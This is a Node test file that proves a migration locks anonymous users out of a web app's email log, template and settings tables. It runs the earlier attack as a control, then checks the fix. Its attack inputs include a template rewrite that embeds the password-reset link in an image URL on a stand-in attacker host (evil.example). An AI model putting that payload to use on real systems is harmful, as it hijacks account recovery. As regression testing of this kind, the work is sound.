/**
 * email-tables-lockdown.node.test.ts — email_log / email_templates / email_settings, against the real SQL.
 *
 * WHAT WAS WRONG
 *
 * The baseline created "Service role full access to email_log | email_templates | email_settings" with `USING (true)` and
 * NO `TO service_role`. A policy with no role list applies to PUBLIC, so the policy was permissive FOR ALL for anon, and
 * `GRANT ALL ... TO anon` was in place as well: anyone holding the public anon key could read every recipient address and
 * subject we have mailed, rewrite the account.password_reset template (the next genuine reset mail would then carry the
 * recovery link wherever the attacker chose), change the sender, and forge or erase the rows the password-reset throttle
 * counts. Migration 20261115000000 scopes the policies to service_role and strips anon of every privilege.
 *
 * HOW IT PROVES IT
 *
 * The fixture is rebuilt from the BASELINE's own CREATE TABLE and CREATE POLICY text, with Supabase's default grants
 * (anon / authenticated / service_role get ALL), so the "before" state is production's. The attack is run first, as anon,
 * and must SUCCEED (a control: a test that cannot fail proves nothing). Then the migration is applied and the same
 * attack must fail, for every command on every table. service_role keeps working, the admin Email Centre keeps working,
 * and the real shared sender (supabase/functions/_shared/send-email.ts) runs against the fixed database as service_role.
 *
 * SAFETY — ISOLATED DATABASE ONLY: requires PASS_PROOF_DSN, refuses a DSN mentioning Supabase. Nothing is sent: Postmark's
 * HTTP API is a fake.
 */

import { test, describe, before, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { loadModule } from './_support/load-source.ts';

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const MIG = join(REPO_ROOT, 'supabase/migrations');
const BASELINE = join(MIG, '20260623000000_baseline_remote_schema.sql');
const FIX = join(MIG, '20261115000000_email_tables_lock_down.sql');
const DSN = process.env.PASS_PROOF_DSN ?? '';
const PSQL = process.env.PASS_PROOF_PSQL ?? 'psql';
const src = (p: string) => readFileSync(p, 'utf8');

/** Runs SQL and returns everything psql said — stdout AND stderr — so a refusal is visible. Never throws. */
function raw(body: string): string {
  const r = spawnSync(PSQL, [DSN, '-X', '-q', '-t', '-A', '-v', 'ON_ERROR_STOP=0', '-c', body],
    { cwd: REPO_ROOT, encoding: 'utf8', timeout: 120_000 });
  return `${r.stdout ?? ''}${r.stderr ?? ''}`;
}
const TAG = /^(SET|RESET|BEGIN|COMMIT|ROLLBACK|DO|GRANT|REVOKE|COMMENT|CREATE .*|DROP .*|INSERT \d+ \d+|UPDATE \d+|DELETE \d+)$/;
const rowsOf = (out: string) => out.split('\n').map((l) => l.trim()).filter((l) => l && !TAG.test(l) && !/^ERROR|^psql:|^LINE |^\s*\^|^DETAIL|^HINT/.test(l));
const scalar = (sql: string) => rowsOf(raw(sql)).pop() ?? '';

const ADMIN = 'a0a0a0a0-0000-4000-8000-a0a0a0a0a0a0';
const ALICE = 'a1a1a1a1-1111-4111-8111-a1a1a1a1a1a1';
const EVE   = 'e3e3e3e3-3333-4333-8333-e3e3e3e3e3e3';

type Who = 'anon' | 'alice' | 'admin' | 'service';
const roleSql = (who: Who) =>
  who === 'anon' ? 'set local role anon;'
  : who === 'service' ? 'set local role service_role;'
  : `set local request.jwt.claim.sub = '${who === 'admin' ? ADMIN : ALICE}'; set local role authenticated;`;
/** One statement as `who`, in a transaction that is ROLLED BACK — so a write that succeeds leaves nothing behind. */
const tryAs = (who: Who, sql: string) => raw(`begin; ${roleSql(who)} ${sql}; rollback;`);
/** As `who`, committed (used only for the service-role fixtures the flow tests read back). */
const doAs = (who: Who, sql: string) => raw(`begin; ${roleSql(who)} ${sql}; commit;`);

const denied = (out: string) => /permission denied/i.test(out);
const blockedByRls = (out: string) => /row-level security/i.test(out);
/** rows touched by a write, via a CTE so the count survives `returning` */
const touched = (who: Who, write: string) =>
  Number(rowsOf(tryAs(who, `with w as (${write} returning 1) select count(*) from w`)).pop() ?? NaN);

const TABLES = ['email_log', 'email_templates', 'email_settings'] as const;

const INSERT_FOR: Record<(typeof TABLES)[number], string> = {
  email_log: `insert into public.email_log (template_key, recipient_email, subject) values ('forged', 'victim@example.org', 'forged')`,
  email_templates: `insert into public.email_templates (key, category, label, subject, body_html) values ('forged.key', 'x', 'x', 'x', '<p>x</p>')`,
  email_settings: `insert into public.email_settings (from_name) values ('Forged')`,
};
const UPDATE_FOR: Record<(typeof TABLES)[number], string> = {
  email_log: `update public.email_log set recipient_email = 'forged@example.org'`,
  email_templates: `update public.email_templates set body_html = '<img src="https://evil.example/x?u={{reset_url}}">' where key = 'account.password_reset'`,
  email_settings: `update public.email_settings set from_email = 'forged@evil.example'`,
};
const DELETE_FOR: Record<(typeof TABLES)[number], string> = {
  email_log: 'delete from public.email_log',
  email_templates: 'delete from public.email_templates',
  email_settings: 'delete from public.email_settings',
};

/** the REAL production password-reset template (migrations_archive/027 seeds it) */
const RESET_BODY = '<h2>Password reset</h2><p>Click below to reset your password. This link expires in 1 hour.</p><p><a href="{{reset_url}}">Reset password</a></p>';
const md5 = (s: string) => createHash('md5').update(s).digest('hex');

let BEFORE: Record<string, string> = {};
let POLICIES_OUTSIDE_BEFORE = '';
let GRANTS_OUTSIDE_BEFORE = '';

const policiesOutside = () => raw(`select string_agg(format('%s|%s|%s|%s|%s|%s', tablename, policyname, cmd, roles, qual, with_check), E'\\n' order by tablename, policyname)
  from pg_policies where schemaname='public' and tablename not in ('email_log','email_templates','email_settings')`);
const grantsOutside = () => raw(`select string_agg(format('%s|%s|%s', table_name, grantee, privilege_type), E'\\n' order by table_name, grantee, privilege_type)
  from information_schema.role_table_grants where table_schema='public' and table_name not in ('email_log','email_templates','email_settings')`);

function policies(table: string): string[] {
  return [...src(BASELINE).matchAll(new RegExp(`CREATE POLICY "[^"]+" ON public\\.${table}[^;]*;`, 'g'))].map((m) => m[0]);
}
function createTable(opener: string): string {
  const s = src(BASELINE); const start = s.indexOf(opener); assert.notEqual(start, -1, `${opener} is gone`);
  const open = s.indexOf('(', start); let d = 0, end = -1;
  for (let i = open; i < s.length; i++) { if (s[i] === '(') d++; else if (s[i] === ')') { d--; if (d === 0) { end = i; break; } } }
  return s.slice(start, end + 1) + ';';
}

before(() => {
  assert.ok(DSN, 'PASS_PROOF_DSN is not set — run `npm run test:isolated`.');
  assert.ok(!/supabase\.co|pooler\.supabase/.test(DSN), 'PASS_PROOF_DSN points at Supabase. Refusing to run.');

  // Rebuild production's PRE-FIX state from the baseline's own text.
  const out = raw([
    'drop schema if exists public cascade; create schema public;',
    'drop schema if exists auth cascade; create schema auth;',
    `do $r$ begin
       if not exists (select 1 from pg_roles where rolname='anon') then create role anon; end if;
       if not exists (select 1 from pg_roles where rolname='authenticated') then create role authenticated; end if;
       if not exists (select 1 from pg_roles where rolname='service_role') then create role service_role; end if;
     end $r$;`,
    'alter role service_role bypassrls;',
    'grant usage on schema public, auth to anon, authenticated, service_role;',
    'create table auth.users (id uuid primary key);',
    `create or replace function auth.uid() returns uuid language sql stable as $$
       select nullif(current_setting('request.jwt.claim.sub', true), '')::uuid $$;`,
    'grant execute on function auth.uid() to anon, authenticated, service_role;',
    `create table public.profiles (id uuid primary key, role text default 'customer');`,
    createTable('CREATE TABLE public.email_log ('),
    createTable('CREATE TABLE public.email_templates ('),
    createTable('CREATE TABLE public.email_settings ('),
    'alter table public.email_log add primary key (id);',
    'alter table public.email_templates add primary key (id); alter table public.email_templates add unique (key);',
    'alter table public.email_settings add primary key (id);',
    'alter table public.email_log enable row level security; alter table public.email_templates enable row level security; alter table public.email_settings enable row level security;',
    ...policies('email_log'), ...policies('email_templates'), ...policies('email_settings'),
    // a table this migration must NOT touch, with a policy and grants of its own
    `create table public.control_t (id int primary key, note text); alter table public.control_t enable row level security;
     create policy control_read on public.control_t for select to anon, authenticated using (true);`,
    // Supabase's default privileges: every client role gets ALL on every table.
    'grant all on all tables in schema public to anon, authenticated, service_role;',
  ].join('\n'));
  assert.doesNotMatch(out, /ERROR/i, `fixture did not build:\n${out.slice(0, 1500)}`);

  const seed = raw(`
    insert into public.profiles (id, role) values ('${ADMIN}', 'admin'), ('${ALICE}', 'customer'), ('${EVE}', 'customer');
    insert into public.email_templates (key, category, label, subject, body_html, variables)
      values ('account.password_reset', 'account', 'Password reset', 'Reset your OneShetland password', $b$${RESET_BODY}$b$, '{name,reset_url}'),
             ('events.tickets_confirmed', 'events', 'Tickets', 'Your tickets for {{event_title}}', '<p>Hi {{buyer_name}}, see <a href="{{tickets_url}}">tickets</a></p>', '{event_title}'),
             ('gifts.disabled', 'gifts', 'Off', 'x', '<p>x</p>', '{}');
    update public.email_templates set enabled = false where key = 'gifts.disabled';
    insert into public.email_settings (reply_to, footer_promo_text, footer_promo_url) values ('hello@oneshetland.com', 'Visit OneShetland', 'https://oneshetland.com');
    insert into public.email_log (template_key, recipient_id, recipient_email, subject, metadata)
      values ('account.password_reset', '${ALICE}', 'alice@example.org', 'Reset your OneShetland password', '{"flow":"password_reset"}'),
             ('events.tickets_confirmed', null, 'eve@example.org', 'Your tickets for Up Helly Aa', '{"order_id":"o-1"}');
    insert into public.control_t values (1, 'untouched');`);
  assert.doesNotMatch(seed, /ERROR/i, `seed failed:\n${seed.slice(0, 600)}`);

  // CONTROL — the attack, against the PRE-FIX state, must work. Rolled back, so nothing persists.
  for (const t of TABLES) {
    BEFORE[`select ${t}`] = String(Number(rowsOf(tryAs('anon', `select count(*) from public.${t}`)).pop()));
    BEFORE[`insert ${t}`] = String(touched('anon', INSERT_FOR[t]));
    BEFORE[`update ${t}`] = String(touched('anon', UPDATE_FOR[t]));
    BEFORE[`delete ${t}`] = String(touched('anon', DELETE_FOR[t]));
  }
  POLICIES_OUTSIDE_BEFORE = policiesOutside();
  GRANTS_OUTSIDE_BEFORE = grantsOutside();

  // Apply the migration exactly as written.
  const fix = spawnSync(PSQL, [DSN, '-X', '-q', '-v', 'ON_ERROR_STOP=1', '-f', FIX], { cwd: REPO_ROOT, encoding: 'utf8' });
  assert.equal(fix.status, 0, `migration failed:\n${fix.stderr}`);
});

/* ───────────────────────── CONTROL ───────────────────────── */

describe('CONTROL — the attack worked before the fix (production’s pre-fix state, rebuilt from the baseline)', () => {
  for (const t of TABLES) {
    test(`${t}: anon could read, insert, update and delete`, () => {
      assert.ok(Number(BEFORE[`select ${t}`]) >= 1, `anon read ${BEFORE[`select ${t}`]} rows of ${t} before the fix`);
      assert.equal(BEFORE[`insert ${t}`], '1', `anon could insert into ${t} before the fix`);
      assert.ok(Number(BEFORE[`update ${t}`]) >= 1, `anon could update ${t} before the fix`);
      assert.ok(Number(BEFORE[`delete ${t}`]) >= 1, `anon could delete from ${t} before the fix`);
    });
  }
});

/* ───────────────────────── 1–12  anon ───────────────────────── */

describe('anon is refused everything on all three tables', () => {
  for (const t of TABLES) {
    test(`${t}: cannot SELECT`, () => assert.ok(denied(tryAs('anon', `select count(*) from public.${t}`)), tryAs('anon', `select count(*) from public.${t}`)));
    test(`${t}: cannot INSERT`, () => assert.ok(denied(tryAs('anon', INSERT_FOR[t])), tryAs('anon', INSERT_FOR[t])));
    test(`${t}: cannot UPDATE`, () => assert.ok(denied(tryAs('anon', UPDATE_FOR[t])), tryAs('anon', UPDATE_FOR[t])));
    test(`${t}: cannot DELETE`, () => assert.ok(denied(tryAs('anon', DELETE_FOR[t])), tryAs('anon', DELETE_FOR[t])));
  }
  test('has_table_privilege agrees: anon holds none of SELECT/INSERT/UPDATE/DELETE/TRUNCATE/REFERENCES/TRIGGER', () => {
    for (const t of TABLES) for (const p of ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'TRUNCATE', 'REFERENCES', 'TRIGGER']) {
      assert.equal(scalar(`select has_table_privilege('anon', 'public.${t}', '${p}')`), 'f', `anon still has ${p} on ${t}`);
    }
  });
  test('the password-reset template cannot be read, rewritten, deleted or forged by anon — and is byte-for-byte unchanged', () => {
    assert.ok(denied(tryAs('anon', `select body_html from public.email_templates where key='account.password_reset'`)));
    assert.ok(denied(tryAs('anon', UPDATE_FOR.email_templates)));
    assert.ok(denied(tryAs('anon', `delete from public.email_templates where key='account.password_reset'`)));
    assert.ok(denied(tryAs('anon', `insert into public.email_templates (key, category, label, subject, body_html) values ('account.password_reset2', 'a', 'a', 'a', 'a')`)));
    assert.equal(scalar(`select md5(body_html) from public.email_templates where key='account.password_reset'`), md5(RESET_BODY));
  });
});

/* ───────────────────────── 13  ordinary authenticated ───────────────────────── */

describe('an ordinary signed-in user has no direct access', () => {
  for (const t of TABLES) {
    test(`${t}: sees no rows (not even their own log row), changes nothing`, () => {
      assert.equal(Number(rowsOf(tryAs('alice', `select count(*) from public.${t}`)).pop()), 0, `a customer can read ${t}`);
      assert.ok(denied(tryAs('alice', INSERT_FOR[t])), 'a customer can insert');
      assert.ok(denied(tryAs('alice', DELETE_FOR[t])), 'a customer can delete');
    });
  }
  test('email_log: UPDATE is refused outright; email_templates / email_settings UPDATE reaches zero rows', () => {
    assert.ok(denied(tryAs('alice', UPDATE_FOR.email_log)));
    assert.equal(touched('alice', UPDATE_FOR.email_templates), 0);
    assert.equal(touched('alice', UPDATE_FOR.email_settings), 0);
    assert.equal(scalar(`select md5(body_html) from public.email_templates where key='account.password_reset'`), md5(RESET_BODY));
  });
  test('truncate, references and trigger privileges are gone too', () => {
    for (const t of TABLES) for (const p of ['TRUNCATE', 'REFERENCES', 'TRIGGER', 'INSERT', 'DELETE']) {
      assert.equal(scalar(`select has_table_privilege('authenticated', 'public.${t}', '${p}')`), 'f', `authenticated still has ${p} on ${t}`);
    }
    assert.equal(scalar(`select has_table_privilege('authenticated', 'public.email_log', 'UPDATE')`), 'f');
  });
});

/* ───────────────────────── 18  the admin Email Centre ───────────────────────── */

describe('the admin Email Centre keeps working (administrator’s own session)', () => {
  test('an administrator reads all three tables', () => {
    assert.equal(Number(rowsOf(tryAs('admin', 'select count(*) from public.email_templates')).pop()), 3);
    assert.equal(Number(rowsOf(tryAs('admin', 'select count(*) from public.email_settings')).pop()), 1);
    assert.equal(Number(rowsOf(tryAs('admin', 'select count(*) from public.email_log')).pop()), 2);
  });
  test('an administrator edits a template and the settings (what components/admin and app/(admin)/email-centre.tsx do)', () => {
    assert.equal(touched('admin', `update public.email_templates set enabled = false where key = 'events.tickets_confirmed'`), 1);
    assert.equal(touched('admin', `update public.email_settings set from_name = 'OneShetland'`), 1);
  });
  test('the log stays append-only for the browser, even for an administrator', () => {
    assert.ok(denied(tryAs('admin', UPDATE_FOR.email_log)));
    assert.ok(denied(tryAs('admin', DELETE_FOR.email_log)));
    assert.ok(denied(tryAs('admin', INSERT_FOR.email_log)));
  });
});

/* ───────────────────────── 14  service_role ───────────────────────── */

describe('service_role keeps full server-side access', () => {
  for (const t of TABLES) {
    test(`${t}: select, insert, update, delete all work`, () => {
      assert.ok(Number(rowsOf(tryAs('service', `select count(*) from public.${t}`)).pop()) >= 1);
      assert.equal(touched('service', INSERT_FOR[t]), 1);
      assert.ok(touched('service', UPDATE_FOR[t]) >= 1);
      assert.ok(touched('service', DELETE_FOR[t]) >= 1);
    });
  }
  test('service_role can still edit the password-reset template (the update touches exactly that row)', () => {
    assert.equal(touched('service', UPDATE_FOR.email_templates), 1);
  });
});

/* ───────────────────────── 19, 20  RLS on, nothing else moved ───────────────────────── */

describe('policy shape, RLS, and no collateral change', () => {
  test('RLS is still enabled on all three tables', () => {
    for (const t of TABLES) assert.equal(scalar(`select relrowsecurity from pg_class where oid='public.${t}'::regclass`), 't');
  });
  test('the three "Service role" policies exist, are scoped to service_role ONLY, and nothing ungated reaches a client role', () => {
    for (const t of TABLES) {
      assert.equal(scalar(`select roles::text from pg_policies where tablename='${t}' and policyname='Service role full access to ${t}'`), '{service_role}');
    }
    const ungated = rowsOf(raw(`select tablename||'.'||policyname from pg_policies
      where tablename in ('email_log','email_templates','email_settings')
        and roles && array['public','anon','authenticated']::name[]
        and coalesce(qual,'true') !~ 'profiles'`));
    assert.deepEqual(ungated, [], `ungated client policies remain: ${ungated.join(', ')}`);
  });
  test('the remaining client-facing policies are exactly the three administrator ones', () => {
    const names = rowsOf(raw(`select policyname from pg_policies where tablename in ('email_log','email_templates','email_settings')
      and not roles = array['service_role']::name[] order by 1`));
    assert.deepEqual(names, ['Admins manage email settings', 'Admins manage email templates', 'Admins see all email logs']);
  });
  test('no policy or grant on any OTHER table changed', () => {
    assert.equal(policiesOutside(), POLICIES_OUTSIDE_BEFORE);
    assert.equal(grantsOutside(), GRANTS_OUTSIDE_BEFORE);
    assert.equal(scalar('select note from public.control_t'), 'untouched');
  });
  test('the migration names no table but the three email tables, and does not touch data', () => {
    const sql = src(FIX).split('\n').filter((l) => !l.trim().startsWith('--')).join('\n');
    const named = new Set([...sql.matchAll(/public\.([a-z_]+)/g)].map((m) => m[1]));
    assert.deepEqual([...named].sort(), ['email_log', 'email_settings', 'email_templates']);
    assert.doesNotMatch(sql, /\b(insert\s+into|update\s+public|delete\s+from)\b/i, 'the migration must not change rows');
  });
  test('the migration is idempotent, and its own self-check refuses to commit while an ungated client policy exists', () => {
    raw('grant select on public.email_log to anon;');
    const again = spawnSync(PSQL, [DSN, '-X', '-q', '-v', 'ON_ERROR_STOP=1', '-f', FIX], { cwd: REPO_ROOT, encoding: 'utf8' });
    assert.equal(again.status, 0, again.stderr);                                    // re-run repairs a re-added grant
    assert.equal(scalar(`select has_table_privilege('anon', 'public.email_log', 'SELECT')`), 'f');
    raw(`create policy leak on public.email_templates for select to anon using (true);`);
    const leaked = spawnSync(PSQL, [DSN, '-X', '-q', '-v', 'ON_ERROR_STOP=1', '-f', FIX], { cwd: REPO_ROOT, encoding: 'utf8' });
    assert.notEqual(leaked.status, 0, 'the migration must refuse to commit while an ungated client policy exists');
    assert.match(leaked.stderr, /ungated client policy/);
    raw('drop policy leak on public.email_templates;');
  });
});

/* ───────────────────────── 15–17  the real send flows, as service_role, on the fixed DB ───────────────────────── */

type Row = Record<string, any>;
let postmark: Row[] = [];

/** A supabase-js look-alike that runs each call against the isolated database AS service_role. */
function dbSupabase() {
  const lit = (v: unknown) => `$v$${String(v)}$v$`;
  const one = (sql: string) => {
    const rows = rowsOf(doAs('service', sql));
    if (rows.length !== 1) return { data: null, error: { message: `expected one row, got ${rows.length}` } };
    return { data: JSON.parse(rows[0]), error: null };
  };
  return {
    from(table: string) {
      return {
        select: () => ({
          eq: (col: string, val: unknown) => ({ single: async () => one(`select to_jsonb(t) from public.${table} t where ${col} = ${lit(val)}`) }),
          single: async () => one(`select to_jsonb(t) from public.${table} t`),
        }),
        insert: async (row: Row) => {
          const cols = Object.keys(row).map((c) => `"${c}"`).join(', ');   // only the columns the caller named, so column defaults apply
          const out = doAs('service', `insert into public.${table} (${cols}) select ${cols} from jsonb_populate_record(null::public.${table}, $j$${JSON.stringify(row)}$j$::jsonb)`);
          return { error: /ERROR/.test(out) ? { message: out } : null };
        },
      };
    },
  };
}

function installGlobals() {
  (globalThis as any).Deno = { env: { get: (k: string) => ({ POSTMARK_API_KEY: 'pm-test-token' } as Record<string, string>)[k] } };
  (globalThis as any).fetch = async (url: string, init: any) => {
    assert.equal(url, 'https://api.postmarkapp.com/email', 'only ever talks to Postmark');
    postmark.push(JSON.parse(init.body));
    return { ok: true, status: 200, json: async () => ({ MessageID: 'pm-fake-1', ErrorCode: 0 }) };
  };
}
const sendEmail = () => loadModule('supabase/functions/_shared/send-email.ts',
  { 'https://esm.sh/@supabase/supabase-js@2': {} }).sendEmail as (s: any, i: any) => Promise<any>;

describe('the real send flows still work against the fixed database, as service_role (nothing is sent)', () => {
  beforeEach(() => { postmark = []; installGlobals(); });

  test('password-reset email renders from the DATABASE template, with the server-built link, and is logged', async () => {
    const before = Number(scalar(`select count(*) from public.email_log where template_key='account.password_reset'`));
    const link = 'https://oneshetland.com/reset-password?token_hash=HASH123&type=recovery';
    const r = await sendEmail()(dbSupabase(), { templateKey: 'account.password_reset', recipientEmail: 'alice@example.org',
      variables: { reset_url: link }, metadata: { flow: 'password_reset' } });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(postmark.length, 1);
    assert.equal(postmark[0].Subject, 'Reset your OneShetland password');
    assert.equal(postmark[0].MessageStream, 'outbound');
    assert.equal(postmark[0].ReplyTo, 'hello@oneshetland.com');                       // read from email_settings
    assert.match(postmark[0].HtmlBody, /href="https:\/\/oneshetland\.com\/reset-password\?token_hash=HASH123&amp;type=recovery"/);
    assert.equal(Number(scalar(`select count(*) from public.email_log where template_key='account.password_reset'`)), before + 1);
  });

  test('a ticket / order / launch-style email (any template) renders and logs the same way', async () => {
    const r = await sendEmail()(dbSupabase(), { templateKey: 'events.tickets_confirmed', recipientEmail: 'eve@example.org',
      variables: { event_title: 'Up Helly Aa', buyer_name: 'Eve', tickets_url: 'https://oneshetland.com/account/tickets' }, metadata: { order_id: 'o-2' } });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(postmark[0].Subject, 'Your tickets for Up Helly Aa');
    assert.equal(scalar(`select count(*) from public.email_log where metadata->>'order_id' = 'o-2'`), '1');
  });

  test('a disabled template is skipped and the skip is logged', async () => {
    const r = await sendEmail()(dbSupabase(), { templateKey: 'gifts.disabled', recipientEmail: 'eve@example.org', variables: {} });
    assert.equal(r.skipped, true);
    assert.equal(postmark.length, 0);
  });

  test('the password-reset throttle’s own query (request-password-reset) and the ticket-receipt “already sent?” query both work as service_role', () => {
    const throttle = doAs('service', `select count(*) from public.email_log where recipient_email = 'alice@example.org' and template_key = 'account.password_reset' and sent_at >= now() - interval '60 minutes'`);
    assert.doesNotMatch(throttle, /ERROR|denied/i, throttle);
    assert.ok(Number(rowsOf(throttle).pop()) >= 1);
    const receipt = doAs('service', `select id from public.email_log where template_key = 'events.tickets_confirmed' and metadata->>'order_id' = 'o-1' limit 1`);
    assert.doesNotMatch(receipt, /ERROR|denied/i, receipt);
    assert.equal(rowsOf(receipt).length, 1);
  });

  test('hub-broadcast’s settings read and log insert work as service_role', () => {
    assert.equal(rowsOf(doAs('service', 'select reply_to from public.email_settings limit 1')).pop(), 'hello@oneshetland.com');
    const ins = doAs('service', `insert into public.email_log (template_key, recipient_email, subject, status, metadata) values ('hub.broadcast', 'm@example.org', 'Hello', 'sent', '{}')`);
    assert.doesNotMatch(ins, /ERROR|denied/i, ins);
  });

  test('every function that touches these tables does so through the service-role client (source check)', () => {
    const files: [string, RegExp][] = [
      ['supabase/functions/request-password-reset/index.ts', /const svc = createClient\([\s\S]{0,200}SUPABASE_SERVICE_ROLE_KEY/],
      ['supabase/functions/hub-broadcast/index.ts', /const svc = createClient\([\s\S]{0,200}SUPABASE_SERVICE_ROLE_KEY/],
    ];
    for (const [f, re] of files) assert.match(src(join(REPO_ROOT, f)), re, `${f} must use the service-role client for email tables`);
  });
});

/* ───────────────────────── the password-reset path itself ───────────────────────── */

describe('password-reset path assessment (guards that keep the recovery link out of attacker hands)', () => {
  test('the seeded template has exactly one link and it is {{reset_url}}', () => {
    const hrefs = [...RESET_BODY.matchAll(/href="([^"]*)"/g)].map((m) => m[1]);
    assert.deepEqual(hrefs, ['{{reset_url}}']);
    assert.doesNotMatch(RESET_BODY, /<img|<script|<iframe|<form|https?:\/\//i);
  });
  test('request-password-reset builds reset_url itself from a pinned oneshetland.com origin and sends only via sendEmail', () => {
    const f = src(join(REPO_ROOT, 'supabase/functions/request-password-reset/index.ts'));
    assert.match(f, /target\.searchParams\.set\('token_hash', hashedToken\)/);
    assert.match(f, /variables: \{ reset_url: resetUrl \}/);
  });
});
